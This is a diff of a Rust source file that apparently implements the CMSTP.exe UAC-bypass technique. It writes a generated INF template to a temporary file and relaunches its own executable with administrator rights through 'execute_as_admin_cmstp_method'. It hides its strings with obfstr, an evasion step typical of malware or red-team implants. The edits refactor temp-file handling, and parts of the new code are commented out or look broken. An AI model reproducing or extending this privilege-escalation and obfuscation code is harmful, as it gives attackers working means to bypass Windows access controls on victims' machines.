@@ -1,8 +1,7 @@
 // https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
 
 //! CLEAN UP - temp path etc
-// use crate::{ err, warn, info, verbose };
-
+use tempfile::{ NamedTempFile, tempdir };
 use anyhow::{ anyhow, Context, Result };
 use obfstr::obfstr as s;
 use std::fs::create_dir_all;
@@ -31,6 +30,8 @@ use winapi::{
         },
     },
 };
+
+use crate::utils::functions::get_current_exe;
 
 pub struct WindowInfo {
     name: String,
@@ -117,26 +118,19 @@ ShortSvcName="Connect"
     );
     // info!("Generated INF template: \n", inf_template);
 
-    let appdata_dir = std::env::var(s!("APPDATA")).unwrap_or(s!("%APPDATA%").to_string());
-    let end_directory = std::path::Path
-        ::new(&appdata_dir)
-        .join(s!("misc-all"))
-        .to_string_lossy()
-        .to_string();
+    // create_dir_all(&end_directory).context(s!("Failed to CREATE DIR ALL FOR path").to_string())?;
 
-    create_dir_all(&end_directory).context(s!("Failed to CREATE DIR ALL FOR path").to_string())?;
+    // tmp_file_path.push(s!("tmp.ini"));
+    // // info!("Temporary file path: ", tmp_file_path);
 
-    let mut tmp_file_path = std::path::PathBuf::from(end_directory);
-    tmp_file_path.push(s!("tmp.ini"));
-    // info!("Temporary file path: ", tmp_file_path);
+    // let mut tmp_file = std::fs::File::create(&tmp_file_path)?;
 
-    let mut tmp_file = std::fs::File::create(&tmp_file_path)?;
-    // info!("Created temporary file");
+    // // info!("Created temporary file");
 
-    // Write to the temporary file
-    tmp_file
-        .write(&inf_template.as_bytes())
-        .context(s!("Failed to write to temporary file").to_string())?;
+    // // Write to the temporary file
+    // NamedTempFile.write(&inf_template.as_bytes()).context(
+    //     s!("Failed to write to temporary file").to_string()
+    // )?;
 
     // info!("Wrote to temporary file");
 
@@ -165,12 +159,8 @@ ShortSvcName="Connect"
 
 pub fn open_self_as_admin() -> Result<()> {
     // info!("Running self as administrator");
-    let binding = std::env
-        ::current_exe()
-        .context(s!("Failed to get current executable path").to_string())?;
-    let curent_executable = binding
-        .to_str()
-        .context(s!("Failed to convert path to str").to_string())?;
+    let binding = get_current_exe();
+    let curent_executable = binding.to_str().unwrap();
 
     // info!("Current executable: ", curent_executable);
     execute_as_admin_cmstp_method(curent_executable).context(
